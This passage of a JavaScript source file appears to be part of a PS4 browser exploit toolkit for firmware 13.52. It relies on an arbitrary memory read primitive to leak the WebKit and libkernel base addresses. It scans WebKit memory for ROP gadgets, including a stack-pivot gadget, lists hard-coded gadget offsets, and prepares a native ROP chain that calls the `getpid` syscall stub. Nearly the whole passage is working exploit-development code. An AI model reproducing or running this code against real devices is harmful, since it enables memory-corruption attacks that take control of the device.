import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { groomBootLine, wireGroomBar } from "./groom_presets.js";
import {
    PIVOT_HINTS_1300,
    PIVOT_HW_1352,
    pivotHint,
    pivotScanHint,
    PIVOT_ROWS,
    pivotPattern,
    verifyPivotSet,
    mergeScannedPivot,
    loadScannedPivot,
    saveScannedPivot,
    sanitizeScannedPivotStorage,
    G5_PATTERNS,
    checkG5Bytes,
    g5DerivedHint,
    G5_DELTA_FROM_G0,
    G5_EXPM1_DELTA,
    g5Expm1Hint,
    g5RvaSafe,
    webkitRvaMax,
    webkitRvaMaxFromOff,
    saveWebkitRvaProbe,
} from "./pivot_gadgets.js";
import {
    resolveLibkernel,
    scanErrorIatChunk,
    isGetpidStub as lkIsGetpidStub,
} from "./libkernel_resolve.js";

const params = new URLSearchParams(location.search);
const BUILD_ID = "rw-20250828w";
/** opt-in only — release triggers JSC GC */
const PROMOTE_PAIR = params.get("promote") === "1";
const RESTORE_LOG = params.get("restorelog") === "1";
const SCAN_PIVOT_MIN = 0x10000;
/** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
/** Scan low .text — G0-G4 live below ~0xe3e4a on 13.52 */
const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "800000", 16);
const SCAN_CLUSTER_PAD = parseInt(params.get("scanclusterpad") || "40000", 16);
const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
/** Bounded steps per auto-loop tick — yields + GC between chunks */
const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
/** HW G5 @ +0x13ec77a (expm1 + 0x53642a) */
const G5_HUNT_CENTER = parseInt(params.get("g5center") || "13ec77a", 16);
const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
/** Legacy 13.00 high G5 — blocked on 13.52 (unmapped, OOM on read) */
const G5_LEGACY_RVAS = [
    [0x2abccaa, "13.00"],
    [0x2abb0ba, "12.50"],
    [0x2abb03a, "12.00"],
];
/** G5 full low scan is opt-in (OOM risk) */
let scanG5Full = params.get("g5full") === "1";
let g5Hunt = null;
/** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "256", 10);
const SCAN_G5_CAND_MAX = 24;
const ELF_MAGIC = 0x464c457f;
const SYS_GETPID = 20;
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
    wk_expm1_builtin: 0xeb6350,
};

const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const PERSIST_MAX = 150;
const SS_LOG = "wk-rw-log";
const SS_STATE = "wk-rw-state";
const SS_LOG_BUILD = "wk-rw-log-build";
/** Only persist milestones — not every ATTEMPT line (sessionStorage churn OOMs) */
const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|GADGET|PASS|FAIL|WARN|BOOT|ERROR|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE|WEBKIT|LIBKERNEL|GETPID|BASE|ELF|CODE|SAVE|SCAN)/;
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;

let persistBuf = null;
let raceMode = false;
const raceBuf = [];

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
let btnStart, btnSaveBases, btnRwProof, btnNative, btnPeek, btnClear;
let btnVerifyPivot, btnScanPivot;
let gadgetBtns = [];
let g5BarBtns = [];
let nativeChain = null;
let nativeAllowed = false;
let pivotReady = false;
let pivotScan = null;
let scanPivotAuto = false;
let scanPivotStop = false;
let scanQuiet = false;
let scanRenderPending = 0;
const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
const _scanBytes = new Array(8);
const _win16 = new Array(16);

function $(id) { return document.getElementById(id); }

function renderOut() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function persistLine(tag, line) {
    if (!PERSIST_TAGS.test(tag)) return;
    try {
        if (!persistBuf) {
            persistBuf = (sessionStorage.getItem(SS_LOG) || "")
                .split("\n").filter(Boolean);
            while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        }
        persistBuf.push(line);
        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
    } catch (_) { }
}

function persistState(msg, cls) {
    if (busy && !/OK|FAIL|error|native|primitive|promote|broken/i.test(msg || "")) return;
    try {
        sessionStorage.setItem(SS_STATE, JSON.stringify({
            msg: msg || "",
            cls: cls || "",
            build: BUILD_ID,
            t: Date.now(),
        }));
    } catch (_) { }
}

function clearPersistedLog() {
    persistBuf = null;
    try {
        sessionStorage.removeItem(SS_LOG);
        sessionStorage.removeItem(SS_STATE);
        sessionStorage.removeItem(SS_LOG_BUILD);
    } catch (_) { }
}

function restorePersistedLog() {
    try {
        const prev = sessionStorage.getItem(SS_LOG);
        if (!prev) return false;
        const build = sessionStorage.getItem(SS_LOG_BUILD) || "?";
        const st = sessionStorage.getItem(SS_STATE);
        lines.push("=== RESTORED (prev build=" + build + ") ===");
        for (const l of prev.split("\n")) {
            if (l) lines.push(l);
        }
        lines.push("=== RELOAD build=" + BUILD_ID + " ===");
        if (st) {
            try {
                const j = JSON.parse(st);
                if (j.msg) lines.push("LAST-STATE  " + j.msg);
            } catch (_) { }
        }
        return true;
    } catch (_) {
        return false;
    }
}

function flushPersistMilestones() {
    try {
        persistBuf = [];
        for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            const tag = line.split(/\s/)[0];
            if (PERSIST_TAGS.test(tag)) persistBuf.push(line);
        }
        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
        if (persistBuf.length)
            sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
    } catch (_) { }
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    if (raceMode) {
        raceBuf.push(line);
        if (raceBuf.length > 48) raceBuf.shift();
        if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag)) {
            lines.push(line);
            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
            if (outEl) {
                outEl.textContent = lines.join("\n");
                outEl.scrollTop = outEl.scrollHeight;
            }
        }
        return;
    }
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    if (scanQuiet && !SCAN_MARK_TAGS.test(tag)) {
        scanRenderPending++;
        if (scanRenderPending >= 48) {
            scanRenderPending = 0;
            renderOut();
        }
        return;
    }
    scanRenderPending = 0;
    persistLine(tag, line);
    renderOut();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (!raceMode) persistState(msg, cls);
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
    if (btnRwProof) btnRwProof.disabled = busy || !ready;
    if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
    if (btnScanPivot) {
        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto);
        btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
    }
    if (btnNative) {
        btnNative.disabled = busy || !ready || !nativeAllowed || !pivotReady;
        btnNative.title = pivotReady
            ? "pivot chain verified — safe to try getpid"
            : "blocked — verify or scan pivot gadgets first (13.00 RVAs wrong on 13.52)";
    }
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy || !ready;
    for (let i = 0; i < gadgetBtns.length; i++)
        gadgetBtns[i].disabled = busy || !ready;
    for (let i = 0; i < g5BarBtns.length; i++)
        g5BarBtns[i].disabled = busy || !ready;
    const btnClearPivot = $("btn-clear-pivot");
    if (btnClearPivot) btnClearPivot.disabled = busy;
    const btnRestorePivot = $("btn-restore-pivot");
    if (btnRestorePivot) btnRestorePivot.disabled = busy;
}

function updatePivotReady(p, off) {
    const { webkitBase } = basesFromSession(off);
    if (!p || !webkitBase) {
        pivotReady = false;
        return null;
    }
    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
    pivotReady = v.ok;
    return v;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function fmtHex32(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16);
}

function fmtBytes(arr) {
    return arr.map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
}

/** Bases from sessionStorage only — no leakval (OOM-safe). */
function basesFromSession(off) {
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    let derived = null;
    if (nativeFn && off.wk_expm1_builtin)
        derived = nativeFn.sub32(off.wk_expm1_builtin);
    if (derived) {
        if (!webkitBase || !same64(webkitBase, derived)) {
            if (webkitBase && nativeFn)
                mark("BASE-FIX", "webkitBase stale cached — using nativeFn-expm1");
            webkitBase = derived;
        }
    }
    let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
    return { nativeFn, webkitBase, libkernelBase };
}

function checkPat(p, base, rva, pat) {
    if (rva == null || !base) return { ok: false, detail: "no base/rva" };
    const addr = base.add32(rva);
    const got = [];
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, addr.add32(i));
        if (b == null) return { ok: false, detail: "read-fail @+" + rva.toString(16) };
        got.push(b & 0xff);
        if ((b & 0xff) !== pat[i])
            return {
                ok: false,
                detail: "+0x" + rva.toString(16) + " got=" + fmtBytes(got)
                    + " want=" + fmtBytes(pat.filter(x => x != null)),
            };
    }
    return { ok: true, detail: "+0x" + rva.toString(16) + " " + fmtBytes(got) };
}

function isGetpidStub(v) {
    return lkIsGetpidStub(v);
}

/** Manual tests — one button = minimal reads, one log line. */
const MANUAL_TESTS = [
    { id: "elf", group: "base", label: "ELF @ base" },
    { id: "native", group: "base", label: "nativeFn code" },
    { id: "scan-iat", group: "base", label: "Scan IAT" },
    { id: "libkernel", group: "base", label: "libkernel" },
    { id: "stub20", group: "base", label: "getpid stub" },
    { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
    { id: "pop_rsi", group: "pop", label: "POP RSI", key: "wk_POP_RSI_RET", pat: [0x5e, 0xc3] },
    { id: "pop_rdx", group: "pop", label: "POP RDX", key: "wk_POP_RDX_RET", pat: [0x5a, 0xc3] },
    { id: "pop_rcx", group: "pop", label: "POP RCX", key: "wk_POP_RCX_RET", pat: [0x59, 0xc3] },
    { id: "pop_rax", group: "pop", label: "POP RAX", key: "wk_POP_RAX_RET", pat: [0x58, 0xc3] },
    { id: "pop_r8", group: "pop", label: "POP R8", key: "wk_POP_R8_RET", pat: [null, 0x58, 0xc3] },
    { id: "pop_r9", group: "pop", label: "POP R9", key: "wk_POP_R9_RET", pat: [null, 0x59, 0xc3] },
    { id: "leave", group: "pop", label: "LEAVE", key: "wk_LEAVE_RET", pat: [0xc9, 0xc3] },
    { id: "mov_rdi_rax", group: "pivot", label: "MOV [rdi],rax", key: "wk_MOV_QWORD_PTR_RDI_RAX_RET", pat: [0x48, 0x89, 0x07, 0xc3] },
    { id: "g0", group: "pivot", label: "G0", key: "wk_MOV_RDI_RSI_30_CALL", pat: [0x48, 0x8b, 0x7e, 0x30] },
    { id: "g1", group: "pivot", label: "G1", key: "wk_POP_RAX_MOV_RAX_JMP_18", pat: [0x58, 0x48, 0x8b, 0x07] },
    { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
    { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
    { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
    { id: "g5", group: "pivot", label: "G5 probe", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
];

function runManualTest(testId) {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase, libkernelBase } = basesFromSession(off);
    const test = MANUAL_TESTS.find(t => t.id === testId);
    if (!test) return;

    if (test.group === "base") {
        if (testId === "elf") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "ELF — no webkitBase (Save bases or cal Accept)");
                return;
            }
            const magic = read4p(p, webkitBase);
            if (magic === ELF_MAGIC)
                mark("GADGET-OK", "ELF magic @ " + webkitBase);
            else if (off.wk_POP_RDI_RET != null) {
                const g = checkPat(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]);
                mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                    "ELF miss peek=" + fmtHex32(magic) + " but POP_RDI " + g.detail);
            } else {
                mark("GADGET-BAD", "ELF @ " + webkitBase + " peek=" + fmtHex32(magic));
            }
            return;
        }
        if (testId === "native") {
            if (!nativeFn) {
                mark("GADGET-SKIP", "nativeFn — tap Save bases or cal Accept");
                return;
            }
            const q0 = read4p(p, nativeFn);
            if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
                mark("GADGET-BAD", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            else
                mark("GADGET-OK", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            return;
        }
        if (testId === "libkernel") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "libkernel — no webkitBase");
                return;
            }
            const r = resolveLibkernel(p, webkitBase, off, {
                log: mark,
                read8: read8p,
            });
            if (r.ok)
                mark("GADGET-OK", "libkernel " + r.lk + " (" + r.source + ")");
            else
                mark("GADGET-BAD", r.error || "libkernel resolve failed");
            return;
        }
        if (testId === "scan-iat") {
            runScanIat().catch(function (err) {
                mark("LK-FAIL", err.message || String(err));
                busy = false;
                setUi();
                renderOut();
            });
            return;
        }
        if (testId === "stub20") {
            let lk = libkernelBase;
            if (!lk && webkitBase) {
                const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
                if (r.ok) lk = r.lk;
            }
            if (!lk) {
                mark("GADGET-SKIP", "getpid stub — run libkernel test first");
                return;
            }
            const o = off.k_stubs && off.k_stubs[SYS_GETPID];
            if (o == null) {
                mark("GADGET-SKIP", "no k_stubs[20] offset");
                return;
            }
            const v = read8p(p, lk.add32(o));
            if (isGetpidStub(v))
                mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
            else
                mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
            return;
        }
    }

    if (!webkitBase) {
        mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
        return;
    }
    let rva = off[test.key];
    let pat = test.pat;
    if (test.spKey && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    if (rva == null && test.group === "pivot") {
        if (testId === "g5") {
            runG5ClusterProbe();
            return;
        }
        const hint = pivotHint(test.key);
        if (hint > 0 && g5RvaSafe(hint, off)) {
            const g = checkPat(p, webkitBase, hint, pat);
            mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                test.label + " hint +0x" + hint.toString(16) + " " + g.detail);
        } else {
            mark("GADGET-SKIP", test.label + " — no safe low RVA (never reads 13.00 high hint)");
        }
        updatePivotReady(p, off);
        setUi();
        return;
    }
    if (testId === "g5" && rva != null) {
        const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
        mark(g5 ? "GADGET-OK" : "GADGET-BAD",
            test.label + " +0x" + rva.toString(16)
                + (g5 ? " " + g5.kind : " — not a rdx→rsp pivot"));
        updatePivotReady(p, off);
        setUi();
        return;
    }
    const g = checkPat(p, webkitBase, rva, pat);
    mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
    if (test.group === "pivot") {
        updatePivotReady(p, off);
        setUi();
    }
}

function saveBasesManual() {
    if (!ready || !window.p || busy) return;
    busy = true;
    setUi();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
        if (!nativeFn) {
            mark("SAVE-FAIL", "nativeFn capture failed");
            return;
        }
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const webkitBase = (nativeFn && off.wk_expm1_builtin)
            ? nativeFn.sub32(off.wk_expm1_builtin)
            : resolveWebkitBase(off, nativeFn);
        if (webkitBase) {
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
        } else {
            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
        }
        state("bases saved — tap gadget buttons", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function gadgetBytesHex(p, base, rva, n) {
    const out = [];
    for (let i = 0; i < n; i++) {
        const b = read1p(p, base.add32(rva + i));
        out.push(b == null ? "??" : (b & 0xff).toString(16).padStart(2, "0"));
    }
    return out.join(" ");
}

function pivotRowByLabel(label) {
    const base = label.split(" ")[0];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === base) return PIVOT_ROWS[i];
    }
    return null;
}

function logPivotBadBytes(p, webkitBase, off, labels) {
    for (let i = 0; i < labels.length; i++) {
        const lab = labels[i].split(" ")[0];
        const row = pivotRowByLabel(lab);
        if (!row) continue;
        const rva = off[row[1]];
        if (rva == null) continue;
        const pat = pivotPattern(row, off);
        const n = lab === "G5" ? 6 : Math.max(pat.length, 4);
        mark("PIVOT-HEX", lab + " +0x" + rva.toString(16)
            + " got " + gadgetBytesHex(p, webkitBase, rva, n)
            + (lab === "G5" ? " (want 52 5c c3 or 48 89 d4 c3)" : ""));
    }
}

function pivotNotReadyMsg(v) {
    const parts = [];
    if (v.missing.length) parts.push("missing " + v.missing.join(", "));
    if (v.bad.length) parts.push("bad " + v.bad.join(", "));
    return parts.length ? parts.join("; ") : "?";
}

function applyG5Rva(rva) {
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
    mark("G5-SET", "+0x" + rva.toString(16) + " saved — verifying…");
    if (ready && window.p && webkitBase) {
        verifyPivotManual();
    } else if (!webkitBase) {
        mark("G5-HINT", "Save bases then tap Verify pivot");
    }
    setUi();
}

function clearPivotState() {
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
        sessionStorage.removeItem("wk-scanned-pivot");
        sessionStorage.removeItem("wk-scanned-pivot-base");
    } catch (_) { }
    sanitizeScannedPivotStorage();
    pivotScan = null;
    pivotReady = false;
    mark("PIVOT-CLEAR", "G5 + scan state cleared — G0-G4 restored to HW table");
    setUi();
}

function restoreHwPivot() {
    sanitizeScannedPivotStorage();
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
    } catch (_) { }
    pivotScan = null;
    mark("PIVOT-RESTORE", "G0-G4 HW RVAs restored — only G5 from session if set");
    if (ready && window.p) verifyPivotManual();
    else setUi();
}

function pickBestG5Cand(cands, center) {
    if (!cands.length) return null;
    const rdx = cands.filter(c => /rdx/i.test(c.kind));
    const pool = rdx.length ? rdx : cands;
    pool.sort((a, b) => Math.abs(a.rva - center) - Math.abs(b.rva - center));
    return pool[0];
}

function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
    if (!fillWindow16(p, webkitBase, rva, _win16)) return;
    for (let pi = 0; pi < G5_PATTERNS.length; pi++) {
        const pat = G5_PATTERNS[pi].pat;
        for (let start = 0; start <= 16 - pat.length; start++) {
            if (!matchPatAt(_win16, start, pat)) continue;
            g5CandPush(cands, { rva: rva + start, kind: G5_PATTERNS[pi].kind }, center);
        }
    }
    for (let start = 0; start <= 12; start++) {
        if (_win16[start + 1] === 0x52 && _win16[start + 2] === 0x5c && _win16[start + 3] === 0xc3
            && _win16[start] >= 0x40 && _win16[start] <= 0x4f) {
            g5CandPush(cands, {
                rva: rva + start,
                kind: "rex push rdx; pop rsp; ret",
            }, center);
        }
    }
}

function scanCapOff() {
    return webkitRvaMax(loadEffectiveOff());
}

function guardG5Rva(rva, tag) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (!g5RvaSafe(rva, off)) {
        mark("G5-BLOCK", (tag || "G5") + " +0x" + rva.toString(16)
            + " beyond mapped webkit (~+0x" + cap.toString(16) + ") — skip read (OOM on HW)");
        return false;
    }
    return true;
}

function tryLegacyG5(rva, tag) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases");
        return;
    }
    const p = window.p;
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    if (!guardG5Rva(rva, tag)) return;
    mark("G5-TRY", tag + " +0x" + rva.toString(16));
    const hex = gadgetBytesHex(p, webkitBase, rva, 8);
    if (hex.indexOf("??") >= 0)
        mark("G5-READ-FAIL", "+0x" + rva.toString(16) + " unreadable — bad base or unmapped");
    else
        mark("G5-HEX", "+0x" + rva.toString(16) + " " + hex);
    const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
    if (g5) {
        mark("GADGET-OK", "G5 " + tag + " +0x" + rva.toString(16) + " " + g5.kind);
        saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
        verifyPivotManual();
    } else {
        mark("GADGET-BAD", "G5 " + tag + " +0x" + rva.toString(16) + " — not rdx→rsp pivot");
    }
}

async function runG5ScanRange(minRva, maxRva, center, label) {
    if (!ready || !window.p || busy) return null;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase — Save bases first");
        return null;
    }
    const cap = webkitRvaMax(off);
    if (minRva > cap) {
        mark("G5-BLOCK", label + " min +0x" + minRva.toString(16)
            + " beyond module ~+0x" + cap.toString(16));
        return null;
    }
    maxRva = Math.min(maxRva, cap);
    if (minRva >= maxRva) {
        mark("G5-SKIP", label + " empty range");
        return null;
    }
    g5Hunt = {
        center: center,
        minRva: minRva,
        maxRva: maxRva,
        cursor: null,
        cands: [],
        done: false,
    };
    busy = true;
    scanQuiet = true;
    setUi();
    mark("G5-HUNT", label + " +0x" + minRva.toString(16) + "…+0x" + maxRva.toString(16));
    let huntBest = null;
    try {
        let finished = false;
        while (!finished)
            finished = await g5HuntChunk(p, webkitBase);
        if (g5Hunt.cands.length) {
            logG5Cands(g5Hunt.cands);
            const best = pickBestG5Cand(g5Hunt.cands, center);
            if (best) {
                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
                huntBest = best.rva;
            }
        } else {
            mark("G5-HUNT-MISS", label + " — no rdx→rsp pivot");
        }
    } finally {
        scanQuiet = false;
        g5Hunt = null;
        busy = false;
        renderOut();
        setUi();
        if (huntBest != null) verifyPivotManual();
    }
    return huntBest;
}

async function runG5HuntNear() {
    if (g5Hunt && !g5Hunt.done) {
        g5Hunt = null;
        mark("G5-STOP", "hunt cancelled");
        return;
    }
    const cap = scanCapOff();
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
        Math.min(cap, G5_HUNT_CENTER + G5_HUNT_RADIUS),
        G5_HUNT_CENTER,
        "low-near-2411b0");
}

async function runG5HuntExpm1() {
    const off = loadEffectiveOff();
    const center = g5Expm1Hint(off) || (HW_GADGETS_1352.wk_expm1_builtin + G5_EXPM1_DELTA);
    if (!g5RvaSafe(center, off)) {
        mark("G5-SKIP", "expm1 hint +0x" + center.toString(16) + " out of module bounds");
        return;
    }
    const cap = webkitRvaMax(off);
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
        Math.min(cap, center + G5_HUNT_RADIUS),
        center,
        "expm1-delta");
}

async function runG5UpperScan() {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    const lo = SCAN_LOW_MAX;
    if (lo >= cap) {
        mark("G5-SKIP", "upper range empty — module ends ~+0x" + cap.toString(16)
            + " (13.00 high G5 @ +0x2abccaa is unmapped)");
        return;
    }
    mark("G5-INFO", "scanning +0x" + lo.toString(16) + "…+0x" + cap.toString(16)
        + " (pop rcx @ +0xeaf246 lives here — missed by 8MB cap)");
    await runG5ScanRange(lo, cap, off.wk_POP_RCX_RET || 0xeaf246, "upper-low");
}

async function probeWebkitBound() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("MOD-SKIP", "no webkitBase");
        return;
    }
    const floor = Math.max(0x100000, webkitRvaMaxFromOff(off) - 0x180000);
    let lastOk = floor;
    mark("MOD-PROBE", "stepping +64K from +0x" + floor.toString(16) + "…");
    busy = true;
    setUi();
    try {
        for (let rva = floor; rva < 0x3500000; rva += 0x10000) {
            const b = read1p(p, webkitBase.add32(rva));
            if (b == null) {
                saveWebkitRvaProbe(lastOk);
                mark("MOD-BOUND", "max readable ~+0x" + lastOk.toString(16)
                    + " (+0x" + rva.toString(16) + " unreadable — no high G5 reads)");
                return;
            }
            lastOk = rva;
            if ((rva & 0xfffff) === 0)
                mark("MOD-PROBE", "+0x" + rva.toString(16) + " ok");
            await new Promise(r => setTimeout(r, 0));
        }
        saveWebkitRvaProbe(lastOk);
        mark("MOD-BOUND", "probe cap +0x" + lastOk.toString(16));
    } finally {
        busy = false;
        setUi();
    }
}

async function runG5FullHunt() {
    scanG5Full = true;
    await runG5ScanRange(SCAN_PIVOT_MIN, SCAN_LOW_MAX, G5_HUNT_CENTER, "low-full");
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5HuntExpm1();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5UpperScan();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    for (let i = 0; i < G5_LEGACY_RVAS.length; i++)
        tryLegacyG5(G5_LEGACY_RVAS[i][0], G5_LEGACY_RVAS[i][1]);
}

async function g5HuntChunk(p, webkitBase) {
    if (!g5Hunt) return true;
    let rva = g5Hunt.cursor != null ? g5Hunt.cursor : (g5Hunt.minRva & ~7);
    let steps = 0;
    while (rva < g5Hunt.maxRva && steps < SCAN_CHUNK_STEPS) {
        scanG5PatternsAt(p, webkitBase, rva, g5Hunt.cands, g5Hunt.center);
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }
    g5Hunt.cursor = rva;
    scanState("G5 hunt @+0x" + rva.toString(16) + " hits=" + g5Hunt.cands.length);
    return rva >= g5Hunt.maxRva;
}

function peekG5Rva(rva) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases first");
        return;
    }
    const off = loadEffectiveOff();
    if (!guardG5Rva(rva, "peek")) return;
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    const addr = webkitBase.add32(rva);
    if (addrIn) addrIn.value = String(addr).replace(/^0x/i, "");
    peekAt(addr);
}

function wireG5Bar() {
    const host = $("gadget-g5");
    if (!host) return;
    const g0 = PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;

    function addBtn(label, fn, alwaysOn) {
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = label;
        b.disabled = !alwaysOn;
        wireClick(b, fn);
        host.appendChild(b);
        if (!alwaysOn) g5BarBtns.push(b);
        return b;
    }

    addBtn("G5 hunt low", function () { runG5HuntNear(); });
